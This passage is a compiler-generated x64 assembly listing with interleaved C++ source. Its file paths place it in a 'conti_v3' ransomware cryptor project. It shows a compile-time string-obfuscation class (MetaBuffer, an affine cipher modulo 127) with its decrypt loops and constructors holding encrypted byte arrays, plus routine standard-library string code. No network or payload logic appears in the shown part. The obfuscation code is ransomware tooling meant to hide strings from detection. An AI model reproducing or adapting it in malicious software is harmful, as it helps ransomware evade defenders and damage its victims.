; 2649 :         _My_data._Myres  = _Small_string_capacity;

  0000c	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00014	66 89 01	 mov	 WORD PTR [rcx], ax
  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
??0drive_info_@filesystem@@QEAA@XZ ENDP			; filesystem::drive_info_::drive_info_
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 06 00 00
	00		 mov	 r10d, 6
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 57 00 00 00	 mov	 eax, 87			; 00000057H
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1a	 mov	 BYTE PTR [rcx+1], 26
  00007	c6 41 02 57	 mov	 BYTE PTR [rcx+2], 87	; 00000057H
  0000b	c6 41 03 2d	 mov	 BYTE PTR [rcx+3], 45	; 0000002dH
  0000f	c6 41 04 57	 mov	 BYTE PTR [rcx+4], 87	; 00000057H
  00013	c6 41 05 57	 mov	 BYTE PTR [rcx+5], 87	; 00000057H
  00017	c6 41 06 57	 mov	 BYTE PTR [rcx+6], 87	; 00000057H
  0001b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0001f	48 8b c1	 mov	 rax, rcx
  00022	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<67,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 24 00 00
	00		 mov	 r10d, 36		; 00000024H
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 6a 00 00 00	 mov	 eax, 106		; 0000006aH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 30	 mov	 BYTE PTR [rcx+1], 48	; 00000030H
  00007	c6 41 02 6a	 mov	 BYTE PTR [rcx+2], 106	; 0000006aH
  0000b	c6 41 03 70	 mov	 BYTE PTR [rcx+3], 112	; 00000070H
  0000f	c6 41 04 6a	 mov	 BYTE PTR [rcx+4], 106	; 0000006aH
  00013	c6 41 05 4e	 mov	 BYTE PTR [rcx+5], 78	; 0000004eH
  00017	c6 41 06 6a	 mov	 BYTE PTR [rcx+6], 106	; 0000006aH
  0001b	c6 41 07 21	 mov	 BYTE PTR [rcx+7], 33	; 00000021H
  0001f	c6 41 08 6a	 mov	 BYTE PTR [rcx+8], 106	; 0000006aH
  00023	c6 41 09 05	 mov	 BYTE PTR [rcx+9], 5
  00027	c6 41 0a 6a	 mov	 BYTE PTR [rcx+10], 106	; 0000006aH
  0002b	c6 41 0b 5e	 mov	 BYTE PTR [rcx+11], 94	; 0000005eH
  0002f	c6 41 0c 6a	 mov	 BYTE PTR [rcx+12], 106	; 0000006aH
  00033	c6 41 0d 6c	 mov	 BYTE PTR [rcx+13], 108	; 0000006cH
  00037	c6 41 0e 6a	 mov	 BYTE PTR [rcx+14], 106	; 0000006aH
  0003b	c6 41 0f 05	 mov	 BYTE PTR [rcx+15], 5
  0003f	c6 41 10 6a	 mov	 BYTE PTR [rcx+16], 106	; 0000006aH
  00043	c6 41 11 5e	 mov	 BYTE PTR [rcx+17], 94	; 0000005eH
  00047	c6 41 12 6a	 mov	 BYTE PTR [rcx+18], 106	; 0000006aH
  0004b	c6 41 13 05	 mov	 BYTE PTR [rcx+19], 5
  0004f	c6 41 14 6a	 mov	 BYTE PTR [rcx+20], 106	; 0000006aH
  00053	c6 41 15 5f	 mov	 BYTE PTR [rcx+21], 95	; 0000005fH
  00057	c6 41 16 6a	 mov	 BYTE PTR [rcx+22], 106	; 0000006aH
  0005b	c6 41 17 13	 mov	 BYTE PTR [rcx+23], 19
  0005f	c6 41 18 6a	 mov	 BYTE PTR [rcx+24], 106	; 0000006aH
  00063	c6 41 19 1e	 mov	 BYTE PTR [rcx+25], 30
  00067	c6 41 1a 6a	 mov	 BYTE PTR [rcx+26], 106	; 0000006aH
  0006b	c6 41 1b 54	 mov	 BYTE PTR [rcx+27], 84	; 00000054H
  0006f	c6 41 1c 6a	 mov	 BYTE PTR [rcx+28], 106	; 0000006aH
  00073	c6 41 1d 2f	 mov	 BYTE PTR [rcx+29], 47	; 0000002fH
  00077	c6 41 1e 6a	 mov	 BYTE PTR [rcx+30], 106	; 0000006aH
  0007b	c6 41 1f 74	 mov	 BYTE PTR [rcx+31], 116	; 00000074H
  0007f	c6 41 20 6a	 mov	 BYTE PTR [rcx+32], 106	; 0000006aH
  00083	c6 41 21 5e	 mov	 BYTE PTR [rcx+33], 94	; 0000005eH
  00087	c6 41 22 6a	 mov	 BYTE PTR [rcx+34], 106	; 0000006aH
  0008b	c6 41 23 6a	 mov	 BYTE PTR [rcx+35], 106	; 0000006aH
  0008f	c6 41 24 6a	 mov	 BYTE PTR [rcx+36], 106	; 0000006aH
  00093	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00097	48 8b c1	 mov	 rax, rcx
  0009a	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >::MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
this$ = 8
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

  00000	48 83 79 18 07	 cmp	 QWORD PTR [rcx+24], 7

; 2236 :         if (_Large_mode_engaged()) {

  00005	76 04		 jbe	 SHORT $LN8@c_str

; 4144 :         return _Mypair._Myval2._Myptr();

  00007	48 8b 01	 mov	 rax, QWORD PTR [rcx]

; 4145 :     }

  0000a	c3		 ret	 0
$LN8@c_str:

; 4144 :         return _Mypair._Myval2._Myptr();

  0000b	48 8b c1	 mov	 rax, rcx

; 4145 :     }

  0000e	c3		 ret	 0
?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z
_TEXT	SEGMENT
this$ = 48
_Ptr$ = 56
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=, COMDAT

; 3239 :     _CONSTEXPR20 basic_string& operator=(_In_z_ const _Elem* const _Ptr) {

$LN22:
  00000	40 57		 push	 rdi
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  00006	4c 8b ca	 mov	 r9, rdx
  00009	48 8b f9	 mov	 rdi, rcx

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  0000c	48 c7 c2 ff ff
	ff ff		 mov	 rdx, -1
$LL17@operator:
  00013	48 ff c2	 inc	 rdx
  00016	66 41 83 3c 51
	00		 cmp	 WORD PTR [r9+rdx*2], 0
  0001c	75 f5		 jne	 SHORT $LL17@operator

; 3412 :         if (_Count <= _Mypair._Myval2._Myres) {

  0001e	48 8b 41 18	 mov	 rax, QWORD PTR [rcx+24]
  00022	48 3b d0	 cmp	 rdx, rax
  00025	77 45		 ja	 SHORT $LN8@operator
  00027	48 89 5c 24 30	 mov	 QWORD PTR [rsp+48], rbx
  0002c	48 89 74 24 38	 mov	 QWORD PTR [rsp+56], rsi

; 2226 :         value_type* _Result = _Bx._Buf;

  00031	48 8b f7	 mov	 rsi, rdi

; 2244 :         return _Myres > _Small_string_capacity;

  00034	48 83 f8 07	 cmp	 rax, 7

; 2227 :         if (_Large_mode_engaged()) {

  00038	76 03		 jbe	 SHORT $LN11@operator

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003a	48 8b 31	 mov	 rsi, QWORD PTR [rcx]
$LN11@operator:

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  0003d	48 8d 1c 12	 lea	 rbx, QWORD PTR [rdx+rdx]

; 3415 :             _Mypair._Myval2._Mysize = _Count;

  00041	48 89 51 10	 mov	 QWORD PTR [rcx+16], rdx

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  00045	4c 8b c3	 mov	 r8, rbx
  00048	49 8b d1	 mov	 rdx, r9
  0004b	48 8b ce	 mov	 rcx, rsi
  0004e	e8 00 00 00 00	 call	 memmove

; 3417 :             _Traits::assign(_Old_ptr[_Count], _Elem());

  00053	33 c0		 xor	 eax, eax
  00055	66 89 04 33	 mov	 WORD PTR [rbx+rsi], ax

; 3240 :         return assign(_Ptr);

  00059	48 8b c7	 mov	 rax, rdi
  0005c	48 8b 74 24 38	 mov	 rsi, QWORD PTR [rsp+56]
  00061	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]

; 3241 :     }

  00066	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0006a	5f		 pop	 rdi
  0006b	c3		 ret	 0
$LN8@operator:
  0006c	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00070	5f		 pop	 rdi

; 3422 :         return _Reallocate_for(

  00071	e9 00 00 00 00	 jmp	 ??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_for<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign'::`2'::<lambda_1>,wchar_t const *>
??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@QEB_W@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

$LN36:
  00000	40 53		 push	 rbx
  00002	48 83 ec 20	 sub	 rsp, 32			; 00000020H

; 2244 :         return _Myres > _Small_string_capacity;

  00006	48 8b 51 18	 mov	 rdx, QWORD PTR [rcx+24]

; 3176 :     _CONSTEXPR20 ~basic_string() noexcept {

  0000a	48 8b d9	 mov	 rbx, rcx

; 2244 :         return _Myres > _Small_string_capacity;

  0000d	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  00011	76 31		 jbe	 SHORT $LN25@basic_stri
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00013	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  00016	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0001e	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00025	72 18		 jb	 SHORT $LN24@basic_stri

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00027	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  0002b	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0002f	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00032	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  00036	48 83 f8 1f	 cmp	 rax, 31
  0003a	77 1f		 ja	 SHORT $LN21@basic_stri

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0003c	49 8b c8	 mov	 rcx, r8
$LN24@basic_stri:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0003f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN25@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  00044	33 c0		 xor	 eax, eax

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00046	48 c7 43 18 07
	00 00 00	 mov	 QWORD PTR [rbx+24], 7
  0004e	48 89 43 10	 mov	 QWORD PTR [rbx+16], rax

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00052	66 89 03	 mov	 WORD PTR [rbx], ax

; 3184 :     }

  00055	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00059	5b		 pop	 rbx
  0005a	c3		 ret	 0
$LN21@basic_stri:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0005b	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00060	cc		 int	 3
$LN33@basic_stri:
??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >, COMDAT

; 2648 :         _My_data._Mysize = 0;

  00000	33 c0		 xor	 eax, eax
  00002	0f 57 c0	 xorps	 xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00005	0f 11 01	 movups	 XMMWORD PTR [rcx], xmm0

; 2648 :         _My_data._Mysize = 0;

  00008	48 89 41 10	 mov	 QWORD PTR [rcx+16], rax

; 2649 :         _My_data._Myres  = _Small_string_capacity;

  0000c	48 c7 41 18 07
	00 00 00	 mov	 QWORD PTR [rcx+24], 7

; 2650 :         _My_data._Activate_SSO_buffer();
; 2651 : 
; 2652 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 2653 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00014	66 89 01	 mov	 WORD PTR [rcx], ax

; 2500 :         _Construct_empty();
; 2501 :     }

  00017	48 8b c1	 mov	 rax, rcx
  0001a	c3		 ret	 0
